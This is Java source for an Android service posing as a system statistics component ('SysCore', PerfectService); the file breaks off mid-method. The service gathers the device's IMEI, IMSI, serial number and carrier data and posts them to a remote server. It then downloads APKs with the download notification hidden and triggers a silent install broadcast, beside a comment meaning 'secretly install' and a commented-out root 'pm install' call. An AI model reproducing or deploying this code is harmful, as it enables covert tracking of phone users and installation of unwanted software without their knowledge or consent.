package com.android.statistics;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.Map.Entry;

import org.apache.http.HttpException;
import org.apache.http.HttpRequest;
import org.apache.http.HttpRequestInterceptor;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.android.statistics.request.PerfectHttpPost;
import com.android.statistics.request.RequestInformation;
import com.android.statistics.utils.HelpUtil;
import com.android.statistics.utils.LogUtil;
import com.android.statistics.utils.PerfectUtil;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.app.DownloadManager.Request;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;

import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.widget.Advanceable;

public class PerfectService extends Service {
	public static Map<String, String> customHeaders = new HashMap<String, String>();
	private static final String TAG = "PerfectService";
	public static final String ACTION_INIT = "com.perfect.android.init";
	public static final String ACTION_PUSH_AGAIN = "com.perfect.android.again";

	byte[] srtbyte = null;

	private String mUserId = null;
	private String userId = null;

	private BroadcastReceiver receiver = null;
	private static final int REGISTER = 0;
	private static final int UPGRADE = 1;
	private static final int FAIL = 2;
	private static String url;
	private static final int connectTimeout = 30 * 1000;
	private static final int readTimeout = 30 * 1000;
	private Handler mHandler;

	private String plmn = "";
	private String country = "";
	private String userIdInSd = null;
	private boolean apkIsExist = false;
	private Uri fileUri = null;

	private Handler handler = new Handler();
	private String download_url;

	@Override
	public IBinder onBind(Intent paramIntent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
		if (LogUtil.flag)
			Log.v(TAG, "SysCore onStartCommand8!");

		initHandler();

		// ChannelId
		SharedPreferences channelIdSharedPreferences = getSharedPreferences("channelid", 0);
		String mChannelID = channelIdSharedPreferences.getString("channelid", "NoChannel");
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mChannelID888111=" + mChannelID);
		if (mChannelID.equals("NoChannel")) {
			String mChannelId = HelpUtil.getChannelID(getApplicationContext());
			SharedPreferences.Editor editorChannelId = getApplicationContext()
					.getSharedPreferences("channelid", MODE_PRIVATE).edit();
			editorChannelId.putString("channelid", mChannelId);
			editorChannelId.commit();

			JSONArray jsonarrayChannelId = new JSONArray();
			String jsonresultChannelId = "";
			JSONObject jsonObjmmChannelId = new JSONObject();

			try {
				jsonObjmmChannelId.put("channelid", mChannelId);
				jsonarrayChannelId.put(jsonObjmmChannelId);

			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}
			jsonresultChannelId = jsonObjmmChannelId.toString();
			if (LogUtil.flag)
				Log.d(TAG, "SysCore jsonresultChannelId41776=" + jsonresultChannelId);
			HelpUtil.writeChannelIdFiletoFile(jsonresultChannelId);
		}
		// UserID
		SharedPreferences versionCodeeSharedPreferences = getSharedPreferences("versionCodee", 0);
		String mVersionCodeeFromServer = versionCodeeSharedPreferences.getString("versionCodee", "65510");
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mVersionCodeeFromServer111=" + mVersionCodeeFromServer);
		SharedPreferences sharedPreferences = getSharedPreferences("Report", 0);
		mUserId = sharedPreferences.getString("aduserId", null);
		if (LogUtil.flag)
			Log.d(TAG, "SysCore mUserId541776=" + mUserId);

		String userMessage = HelpUtil.readUserFile();
		String versionCodee = "65510";
		String useridInSd = null;
		if (userMessage != null && !userMessage.equals("")) {
			JSONObject dataJson;
			try {
				dataJson = new JSONObject(userMessage);
				if (LogUtil.flag)
					Log.d(TAG, "SysCore version_code11776=" + dataJson.getString("version_code"));
				versionCodee = dataJson.getString("version_code");
				if (LogUtil.flag)
					Log.d(TAG, "SysCore user_id11776=" + dataJson.getString("user_id"));
				useridInSd = dataJson.getString("user_id");
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
				useridInSd = null;
				versionCodee = mVersionCodeeFromServer;
			}

		} else {
			useridInSd = null;
			versionCodee = mVersionCodeeFromServer;
		}

		int versionCodeSelf = PerfectUtil.getPackageVersionCode(getApplicationContext().getPackageManager(),
				getApplicationContext().getPackageName());
		Log.d(TAG, "SysCore PackageName---》=" + getApplicationContext().getPackageName());
		if (LogUtil.flag)
			Log.d(TAG, "SysCore versionCodeSelf1776=" + versionCodeSelf);
		if (LogUtil.flag)
			Log.d(TAG, "SysCore versionCodee1776=" + versionCodee);
		if (LogUtil.flag)
			Log.d(TAG, "SysCore mUserId1776=" + mUserId);
		if (LogUtil.flag)
			Log.d(TAG, "SysCore useridInSd1776=" + useridInSd);
		if (LogUtil.flag)
			Log.d(TAG, "SysCore ---------1111=" + (mUserId == null || (mUserId != null && mUserId.equals(""))));
		if (LogUtil.flag)
			Log.d(TAG, "SysCore ------22222=" + (useridInSd == null || (useridInSd != null && useridInSd.equals(""))));
		if (LogUtil.flag)
			Log.d(TAG, "SysCore ------333333=" + (versionCodeSelf > Integer.valueOf(versionCodee).intValue()));
		if (LogUtil.flag)
			Log.d(TAG, "SysCore ------------=" + ((mUserId == null || (mUserId != null && mUserId.equals("")))
					|| (useridInSd == null || (useridInSd != null && useridInSd.equals("")))));

		if ((((mUserId == null || (mUserId != null && mUserId.equals("")))
				|| (useridInSd == null || (useridInSd != null && useridInSd.equals(""))))
				|| versionCodeSelf > Integer.valueOf(versionCodee).intValue())
				&& PerfectUtil.isNetworkAvailable(getApplicationContext()))
			getAdRegister();

		if (LogUtil.flag)
			Log.v(TAG, "SysCore paramIntent8=" + paramIntent);
		if (paramIntent != null) {
			String action = paramIntent.getAction();
			if (LogUtil.flag)
				Log.v(TAG, "SysCore action345=" + action);
			if (action != null) {
				if (action.equals(ACTION_INIT)) {

					SharedPreferences silentTime = getSharedPreferences("SilentTime", 0);
					int silent_Time = silentTime.getInt("silentTime", 0);
					if (LogUtil.flag)
						Log.v(TAG, "SysCore silent_Time567=" + silent_Time);
					// String addTimeString=addTime(silent_Time);
					// long addtiems=addTimes(silent_Time);
					long ii = (long) silent_Time * 24 * 3600 * 1000;
					if (LogUtil.flag)
						Log.v(TAG, "SysCore ii 6464567=" + ii);

					SharedPreferences registerTime = getSharedPreferences("registerTime", 0);
					long regsTime = registerTime.getLong("registerTime", 0);
					if (LogUtil.flag)
						Log.v(TAG, "SysCore regsTime 321567=" + regsTime);

					Date date1 = new Date();
					long nowTime = date1.getTime();
					if (LogUtil.flag)
						Log.v(TAG, "SysCore nowTime 321567=" + nowTime);
					if (LogUtil.flag)
						Log.v(TAG, "SysCore nowTime-regsTime 321567=" + (nowTime - regsTime));
					// if
					// (nowTime!=0&&regsTime!=0&&ii>=0&&(nowTime-regsTime>ii))
					if (nowTime != 0 && regsTime != 0 && ii >= 0 && (nowTime - regsTime > ii)) {

						// SharedPreferences isVisit_SharedPreferences =
						// getSharedPreferences("GetIsVisitUpdate", 0);
						// String isVisit =
						// isVisit_SharedPreferences.getString("isVisit", "NO");
						// if(LogUtil.flag) Log.v(TAG,"SysCore
						// isVisit_SharedPreferences567="+isVisit);
						if (LogUtil.flag)
							Log.v(TAG, "SysCore isNetworkAvailable 567="
									+ PerfectUtil.isNetworkAvailable(getApplicationContext()));
						if (LogUtil.flag)
							Log.v(TAG, "SysCore mUserId567=" + mUserId);
						if (LogUtil.flag)
							Log.v(TAG, "SysCore useridInSd567=" + useridInSd);
						if ((PerfectUtil.isNetworkAvailable(getApplicationContext()) && mUserId != null
								&& !mUserId.equals(""))
								|| (PerfectUtil.isNetworkAvailable(getApplicationContext()) && useridInSd != null
										&& !useridInSd.equals(""))
						// ||(isVisit==null&&PerfectUtil.isNetworkAvailable(getApplicationContext())&&mUserId!=null&&!mUserId.equals(""))
						// ||(isVisit==null&&
						// PerfectUtil.isNetworkAvailable(getApplicationContext())&&useridInSd!=null&&!useridInSd.equals(""))
						) {
							checkClientCanUpdateRequest();
						} else {
							stopSelf();
							return START_NOT_STICKY;
						}

					} else {
						stopSelf();
						return START_NOT_STICKY;
					}
				} else {
					stopSelf();
					return START_NOT_STICKY;
				}
			} else {
				stopSelf();
				return START_NOT_STICKY;
			}

		}
		return START_NOT_STICKY;
	}

	@Override
	public void onDestroy() {
		if (LogUtil.flag)
			Log.i(TAG, "onDestroy");
		super.onDestroy();
	}

	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		if (LogUtil.flag)
			Log.i(TAG, "onStart");
		super.onStart(intent, startId);
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (LogUtil.flag)
			Log.v(TAG, "SysCore enter into the Service:Oncreate8!");

		// SharedPreferences isVisit_SharedPreferences =
		// getSharedPreferences("GetIsVisitUpdateDate", 0);
		// String isVisitDate =
		// isVisit_SharedPreferences.getString("isVisitDate", null);
		// if(LogUtil.flag) Log.v(TAG,"SysCore
		// isVisit_SharedPreferences567="+isVisitDate);
		// if (isVisitDate==null||isDateAfterOrBefore(isVisitDate)) {
		// SharedPreferences.Editor isVisitSharedPreferences =
		// getApplicationContext()
		// .getSharedPreferences("GetIsVisitUpdate",
		// getApplicationContext().MODE_PRIVATE)
		// .edit();
		// isVisitSharedPreferences.putString("isVisit", "NO");
		// isVisitSharedPreferences.commit();
		// }

	}

	private void getAdRegister() {
		// TODO Auto-generated method stub

		DisplayMetrics dm = new DisplayMetrics();
		dm = getResources().getDisplayMetrics();
		int screenWidth = dm.widthPixels;
		int screenHeight = dm.heightPixels;
		final String resolution = Integer.toString(screenWidth) + "*" + Integer.toString(screenHeight);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore resolution6668=" + resolution);

		final String Serial = getSerialNumber();
		if (LogUtil.flag)
			Log.v(TAG, "SysCore Serial6668=" + Serial);

		final String os_version = android.os.Build.VERSION.RELEASE;
		if (LogUtil.flag)
			Log.v(TAG, "SysCore os_version6668=" + os_version);
		final String os_id = Integer.toString(android.os.Build.VERSION.SDK_INT);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore os_id6668=" + os_id);
		// UserId
		final String mUUID = UUID.randomUUID().toString();
		final String mChannelID = HelpUtil.getChannelID(getApplicationContext());

		final String userMessage = HelpUtil.readUserFile();
		if (LogUtil.flag)
			Log.d(TAG, "SysCore userMessage564776=" + userMessage);

		if (userMessage != null && !userMessage.equals("")) {
			JSONObject dataJson;
			try {
				dataJson = new JSONObject(userMessage);
				if (LogUtil.flag)
					Log.d(TAG, "SysCore version_code776=" + dataJson.getString("version_code"));
				if (LogUtil.flag)
					Log.d(TAG, "SysCore user_id776=" + dataJson.getString("user_id"));
				userIdInSd = dataJson.getString("user_id");
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}
		}
		if (LogUtil.flag)
			Log.v(TAG, "SysCore userIdInSd9996668=" + userIdInSd);
		SharedPreferences sharedPreferences = getSharedPreferences("Report", 0);
		String mRegisterUserId = sharedPreferences.getString("aduserId", null);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mRegisterUserId9996668=" + mRegisterUserId);
		if (mRegisterUserId == null && userIdInSd == null) {
			userId = mUUID;
			SharedPreferences.Editor editor = getApplicationContext().getSharedPreferences("Report", MODE_PRIVATE)
					.edit();
			editor.putString("aduserId", userId);
			editor.commit();
		} else {
			if (userIdInSd == null)
				userId = mRegisterUserId;
			if (mRegisterUserId == null)
				userId = userIdInSd;
			if (userIdInSd != null && mRegisterUserId != null)
				userId = userIdInSd;
		}
		if (LogUtil.flag)
			Log.v(TAG, "SysCore userId9996668=" + userId);

		final String mDeviceId = ((TelephonyManager) getApplicationContext()
				.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		;
		final String mSubsId = ((TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE))
				.getSubscriberId();
		final String mDeviceModelId = HelpUtil.getDeviceModel();

		final String versionName = PerfectUtil.getPackageVersionName(getApplicationContext().getPackageManager(),
				getApplicationContext().getPackageName());

		final int versionCode = PerfectUtil.getPackageVersionCode(getApplicationContext().getPackageManager(),
				getApplicationContext().getPackageName());

		try {
			if (mSubsId != null && !mSubsId.equals(""))
				plmn = mSubsId.substring(0, 5);
			else
				plmn = "NPlmn";

			if (mSubsId != null && !mSubsId.equals(""))
				country = mSubsId.substring(0, 3);
			else
				country = "NoSim";
		} catch (ArrayIndexOutOfBoundsException e) {
			if (LogUtil.error_flag)
				e.printStackTrace();
		} catch (StringIndexOutOfBoundsException e) {
			if (LogUtil.error_flag)
				e.printStackTrace();
		}

		final String vendor = android.os.Build.MANUFACTURER;
		// 表示在setting里面
		final String isSystem = "3";

		if (LogUtil.flag)
			Log.v(TAG, "SysCore userId=" + userId);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mChannelID=" + mChannelID);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mDeviceModelId=" + mDeviceModelId);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mDeviceId=" + mDeviceId);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore mSubsId=" + mSubsId);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore plmn=" + plmn);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore Serial=" + Serial);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore os_version=" + os_version);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore os_id=" + os_id);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore vendor=" + vendor);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore versionName=" + versionName);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore versionCode=" + versionCode);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore resolution=" + resolution);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore country=" + country);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore isSystem=" + isSystem);

		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				try {
					httpPostMethod(getApplicationContext(),
							getMchMsData(userId, mChannelID, mDeviceModelId, mDeviceId, mSubsId, plmn, Serial,
									os_version, os_id, vendor, versionName, versionCode, resolution, country, isSystem),
							REGISTER);
				} catch (HttpException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();

		// try {
		// httppost1 = new AsyncHttpPost(getApplicationContext(),
		// getMchMsData(userId, mChannelID, mDeviceModelId, mDeviceId,
		// mSubsId, plmn, Serial, os_version, os_id, vendor, versionName,
		// versionCode, resolution, country, isSystem),
		// new RequestResultCallback(){
		//
		// @Override
		// public void onSuccess(Object o) {
		// Log.e(TAG, "getAdRegister onSuccess=========="+o.toString());
		//// getRegisterData(o.toString());
		// String
		// string="{\"code\":\"200\",\"data\":{\"status\":\"OK\",\"now_time\":\"1460535854526\",\"s_time\":\"30\"},\"message\":\"OK\"}";
		// getRegisterData(string);
		// }
		// @Override
		// public void onFail(Exception e) {
		// // TODO Auto-generated method stub
		// Log.e(TAG, "getAdRegister onFail=========="+e.toString());
		//
		// }
		// },AsyncHttpPost.REGISTER);
		// DefaultThreadPool.getInstance().execute(httppost1);
		// } catch (HttpException e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// } catch (Exception e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// }

	}

	// 获取手机序列号
	public static String getSerialNumber() {
		String serial = null;
		try {
			Class<?> c = Class.forName("android.os.SystemProperties");
			Method get = c.getMethod("get", String.class);
			serial = (String) get.invoke(c, "ro.serialno");
		} catch (Exception ignored) {
		}
		return serial;
	}

	private void checkClientCanUpdateRequest() {

		String userMessage = HelpUtil.readUserFile();
		String useridInSd = null;
		if (userMessage != null && !userMessage.equals("")) {
			JSONObject dataJson;
			try {
				dataJson = new JSONObject(userMessage);
				if (LogUtil.flag)
					Log.d(TAG, "SysCore checkClientCanUpdateRequest user_id 11776=" + dataJson.getString("user_id"));
				useridInSd = dataJson.getString("user_id");
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				if (LogUtil.error_flag)
					e.printStackTrace();
			}

			SharedPreferences sharedPreferences = getSharedPreferences("Report", 0);
			mUserId = sharedPreferences.getString("aduserId", null);
			if (LogUtil.flag)
				Log.d(TAG, "SysCore checkClientCanUpdateRequest mUserId 11776=" + mUserId);
			if (useridInSd != null && mUserId != null && useridInSd.equals(mUserId)) {
				final String mChannelID = HelpUtil.getChannelID(getApplicationContext());
				final String mDeviceModelId = HelpUtil.getDeviceModel();
				SharedPreferences requestSharedPreferences = getSharedPreferences("Request_Time", 0);
				final long request_time = requestSharedPreferences.getLong("request_time", 0);
				if (LogUtil.flag)
					Log.d(TAG, "SysCore checkClientCanUpdateRequest mChannelID 11776=" + mChannelID);
				if (LogUtil.flag)
					Log.d(TAG, "SysCore checkClientCanUpdateRequest mDeviceModelId 11776=" + mDeviceModelId);
				if (LogUtil.flag)
					Log.d(TAG, "SysCore checkClientCanUpdateRequest request_time 11776=" + request_time);

				new Thread(new Runnable() {

					@Override
					public void run() {
						// TODO Auto-generated method stub
						try {
							httpPostMethod(getApplicationContext(),
									getUpdateParameter(mUserId, mChannelID, mDeviceModelId, request_time), UPGRADE);
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}).start();
			}
		}
		// TODO Auto-generated method stub
		// try {
		// httppost1 = new AsyncHttpPost(getApplicationContext(),
		// getUpdateParameter(),
		// new RequestResultCallback(){
		//
		// @Override
		// public void onSuccess(Object o) {
		// Log.e(TAG, "checkClientCanUpdateRequest
		// onSuccess=========="+o.toString());
		//// getUpdateData(o.toString());
		//
		//// String
		// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.s\",\"app_size\":\"123456\",\"download_url\":\"http://gg.angelpush.com/advert/app/SmartTouch/78ce85699d5122e37ab565ba7fc383cd_20150506225721.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"22\"},\"message\":\"OK\"}";
		//// String
		// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.syscore\",\"app_size\":\"123456\",\"download_url\":\"http://bingo-game.b0.upaiyun.com/syscore/SysCore_AD_com_android_syscore_V7.8.3_ad_bd3core_003_20160328.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"12\"},\"message\":\"OK\"}";
		// String
		// string="{\"code\":\"200\",\"data\":{\"package_name\":\"com.android.syscore\",\"app_size\":\"123456\",\"download_url\":\"http://dl.ludashi.com/ludashi/ludashi_home.apk\",\"now_time\":\"1563127854526\",\"s_time\":\"30\",\"version_code\":\"12\"},\"message\":\"OK\"}";
		// getUpdateData(string);
		// }
		// @Override
		// public void onFail(Exception e) {
		// // TODO Auto-generated method stub
		// Log.e(TAG, "checkClientCanUpdateRequest
		// onFail=========="+e.toString());
		// }
		// },AsyncHttpPost.UPGRADE);
		// DefaultThreadPool.getInstance().execute(httppost1);
		// } catch (Exception e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// }

	}

	private List<NameValuePair> getMchMsData(String userId, String channel, String phoneModel, String imei, String imsi,
			String plmn, String serial, String os_version, String os_id, String vendor, String versionName,
			int versionCode, String mResolution, String country, String is_system) throws Exception, HttpException {
		List<NameValuePair> formParams = new ArrayList<NameValuePair>();
		formParams.add(new BasicNameValuePair("user_id", userId));
		formParams.add(new BasicNameValuePair("channel", channel));
		formParams.add(new BasicNameValuePair("phone_model", phoneModel));
		formParams.add(new BasicNameValuePair("imei", imei));
		formParams.add(new BasicNameValuePair("imsi", imsi));
		formParams.add(new BasicNameValuePair("plmn", plmn));
		formParams.add(new BasicNameValuePair("serial", serial));
		formParams.add(new BasicNameValuePair("os_version", os_version));
		formParams.add(new BasicNameValuePair("os_id", os_id));
		formParams.add(new BasicNameValuePair("vendor", vendor));
		// formParams.add(new RequestParameter("version_name", versionName));
		// formParams.add(new RequestParameter("version_code", versionCode));
		formParams.add(new BasicNameValuePair("resolution", mResolution));
		formParams.add(new BasicNameValuePair("country", country));
		formParams.add(new BasicNameValuePair("is_system", is_system));
		Log.v(TAG, "SysCore adRegister54!");
		return formParams;
	}

	private List<NameValuePair> getUpdateParameter(String userId, String channel, String phoneModel,
			long request_time) {

		PerfectHttpPost.initLogin(getApplicationContext());

		List<NameValuePair> formParams = new ArrayList<NameValuePair>();
		// formParams.add(new BasicNameValuePair("user_id", userId));
		// formParams.add(new BasicNameValuePair("channel", channel));
		// formParams.add(new BasicNameValuePair("phone_model", phoneModel));
		formParams.add(new BasicNameValuePair("request_time", String.valueOf(request_time)));
		for (Entry<String, String> header : customHeaders.entrySet()) {
			if (LogUtil.flag)
				Log.e(TAG, header.getKey() + "==yunlong---->= " + getDefaultValue(header.getValue()));
			// request.setHeader(header.getKey(),
			// getDefaultValue(header.getValue()));
			formParams.add(new BasicNameValuePair(header.getKey(), header.getValue()));
		}

		Log.v(TAG, "SysCore getUpdateParameter54!");
		return formParams;
	}

	private void getRegisterData(String string) {
		if (string != null && !string.equals("")) {

			try {
				JSONObject jsonObject = new JSONObject(string);
				String code = jsonObject.getString("code");
				if (LogUtil.flag)
					Log.i(TAG, "getRegisterData code=" + code);
				if (code != null && code.equals("200")) {
					String data = jsonObject.getString("data");
					if (data != null && !data.equals("")) {
						JSONObject jsonObject2 = new JSONObject(data);

						if (jsonObject2 != null && !jsonObject2.equals("")) {
							String status = jsonObject2.getString("status");
							if (LogUtil.flag)
								Log.i(TAG, "getRegisterData jsonObject2 status=" + status);
							SharedPreferences.Editor editorFromServer = getApplicationContext()
									.getSharedPreferences("RegisterUserIdReportFromServer", MODE_PRIVATE).edit();
							editorFromServer.putString("RegisterUserIdReportFromServer", status);
							editorFromServer.commit();

							int versionCode = PerfectUtil.getPackageVersionCode(
									getApplicationContext().getPackageManager(),
									getApplicationContext().getPackageName());
							if (LogUtil.flag)
								Log.d(TAG, "SysCore versionCode88899=" + versionCode);
							if (status != null && status.equals("OK")) {
								int silent_time = jsonObject2.getInt("s_time");
								if (LogUtil.flag)
									Log.i(TAG, "getRegisterData jsonObject2 silent_time=" + silent_time);
								SharedPreferences.Editor silentTime = getApplicationContext()
										.getSharedPreferences("SilentTime", getApplicationContext().MODE_PRIVATE)
										.edit();
								silentTime.putInt("silentTime", silent_time);
								silentTime.commit();

								SharedPreferences.Editor editor = getApplicationContext()
										.getSharedPreferences("Report", MODE_PRIVATE).edit();
								editor.putString("aduserId", userId);
								editor.commit();

								SharedPreferences.Editor versionCodee = getApplicationContext()
										.getSharedPreferences("versionCodee", MODE_PRIVATE).edit();
								versionCodee.putString("versionCodee", String.valueOf(versionCode));
								versionCodee.commit();

								if (LogUtil.flag)
									Log.v(TAG, "SysCore registerTime666=" + jsonObject2.getLong("now_time"));
								SharedPreferences.Editor registerTime = getApplicationContext()
										.getSharedPreferences("registerTime", MODE_PRIVATE).edit();
								registerTime.putLong("registerTime", jsonObject2.getLong("now_time"));
								registerTime.commit();

								JSONArray jsonarray = new JSONArray();
								String jsonresult = "";
								JSONObject jsonObjmm = new JSONObject();

								try {
									jsonObjmm.put("version_code", String.valueOf(versionCode));
									jsonObjmm.put("user_id", userId);
									jsonObjmm.put("register_time", jsonObject2.getLong("now_time"));
									jsonarray.put(jsonObjmm);

								} catch (JSONException e) {
									// TODO Auto-generated catch block
									if (LogUtil.error_flag)
										e.printStackTrace();
								}
								jsonresult = jsonObjmm.toString();

								HelpUtil.writeUserFiletoFile(jsonresult);

								// 注册成功之后，把Service关闭
								stopSelf();// 关闭Service
							}
						}
					}
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private void getRequestUpdateData(String string) {
		if (string != null && !string.equals("")) {
			try {
				JSONObject jsonObject = new JSONObject(string);
				String code = jsonObject.getString("code");
				if (LogUtil.flag)
					Log.i(TAG, "getRequestUpdateData code=" + code);
				if (code != null && code.equals("200")) {
					String data = jsonObject.getString("data");
					if (data != null && !data.equals("")) {

						doAction(data);
					}
				}
				if (code != null && code.equals("304")) {
					stopSelf();
				}
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	public void downloadIntent(Context context, String url, boolean apkIsExist, Uri fileUri) {
		
		
		
		if (apkIsExist) {
			Log.d(TAG, " apkIsExist fileUri=" + fileUri);
			/*Intent install = new Intent(Intent.ACTION_VIEW);
			install.setDataAndType(fileUri, "application/vnd.android.package-archive");
			install.putExtra("FromWhere", "OurSelf");
			install.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(install);*/
			String apkPath = fileUri.getPath().toString();
			Log.d(TAG, " apkpath ---->=" + apkPath);
			Intent install = new Intent("com.android.AutoInstallApkReceiver.install");
			install.putExtra("installPak", apkPath);
			sendBroadcast(install);
		} else {

			String serviceString = Context.DOWNLOAD_SERVICE;
			final DownloadManager downloadManager;
			downloadManager = (DownloadManager) context.getSystemService(serviceString);

			Query myDownloadQuery = new Query();
			myDownloadQuery.setFilterByStatus(DownloadManager.STATUS_RUNNING);

			Cursor myDownload = downloadManager.query(myDownloadQuery);
			boolean isDownLoading = false;
			if (myDownload != null) {
				if (myDownload.moveToFirst()) {
					int downloadUri = myDownload.getColumnIndex(DownloadManager.COLUMN_URI);

					String downloadUriString = myDownload.getString(downloadUri);
					Log.d(TAG, "downloadUri2222" + downloadUriString);
					Log.d(TAG, "url2222" + url);
					Log.d(TAG, "downloadUriString.equals(url)2222" + downloadUriString.equals(url));
					if (downloadUriString != null && url != null && downloadUriString.equals(url)) {
						isDownLoading = true;
					}

				}
				myDownload.close();
			}
			Log.d(TAG, "isDownLoading2222" + isDownLoading);
			if (isDownLoading == false) {

				Log.e(TAG, "downloadIntent url:" + url);
				Uri uri = Uri.parse(url);
				Log.e(TAG, "downloadIntent uri:" + uri);
				DownloadManager.Request request = new Request(uri);
				request.setAllowedNetworkTypes(Request.NETWORK_WIFI | Request.NETWORK_MOBILE);
				
				/**
				 * VISIBILITY_HIDDEN表示不显示任何通知栏提示
				 * 这个需要在AndroidMainfest中添加权限android.permission.DOWNLOAD_WITHOUT_NOTIFICATION.
				 */
				request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
				downloadManager.getRecommendedMaxBytesOverMobile(context);
				request.setDestinationInExternalPublicDir("/Appstore/cache", url.substring(url.lastIndexOf("/")));

				final long myreference = downloadManager.enqueue(request);
				//
				SharedPreferences.Editor downloadInfo = getApplicationContext()
						.getSharedPreferences("DownloadInfo", getApplicationContext().MODE_PRIVATE).edit();
				downloadInfo.putLong("ID", myreference);
				downloadInfo.commit();

				IntentFilter filter = new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
				receiver = new BroadcastReceiver() {
					@Override
					public void onReceive(Context context, Intent intent) {
						long reference = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
						Log.e(TAG, "reference546456564=" + reference);
						
						if (reference == myreference) {
							// 瀵逛笅杞界殑鏂囦欢杩涜涓�浜涙搷浣�
							Log.e(TAG, "reference546456564= install");
							Query myDownloadQuery = new Query();
							myDownloadQuery.setFilterById(reference);

							Cursor myDownload = downloadManager.query(myDownloadQuery);
							if (myDownload != null) {
								if (myDownload.moveToFirst()) {
									int fileNameIdx = myDownload.getColumnIndex(DownloadManager.COLUMN_LOCAL_FILENAME);
									int fileUriIdx = myDownload.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);

									String fileName = myDownload.getString(fileNameIdx);
									String fileUri = myDownload.getString(fileUriIdx);
									Log.d(TAG, fileName + " : " + fileUri);
									if (fileUri != null) {
										/*Intent install = new Intent(Intent.ACTION_VIEW);
										install.setDataAndType(Uri.parse(fileUri),
												"application/vnd.android.package-archive");
										install.putExtra("FromWhere", "OurSelf");
										install.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
										context.startActivity(install);*/
										//偷偷安装
					                  //  RootTools.sendShell("pm install sdcard/apk/game.apk", 5000);
										Log.d(TAG, " fileName --1-->=" +fileName);
										Intent install = new Intent("com.android.AutoInstallApkReceiver.install");
										install.putExtra("installPak", fileName);
										sendBroadcast(install);
					                     
									}
								}
								myDownload.close();
							}
						}
					}

				};
				context.registerReceiver(receiver, filter);
			}
		}
	}
	
	

	private String getDefaultValue(String value) {
		if (value == null)
			return "123456";

		return value;
	}

	private void httpPostMethod(Context context, List<NameValuePair> parameter, int flag) {
		DefaultHttpClient httpClient = null;
		PerfectHttpPost.initLogin(getApplicationContext());
		getUrl(flag);

		if (httpClient == null)
			httpClient = new DefaultHttpClient();
		httpClient.addRequestInterceptor(new HttpRequestInterceptor() {
			public void process(final HttpRequest request, final HttpContext context)
					throws HttpException, IOException {
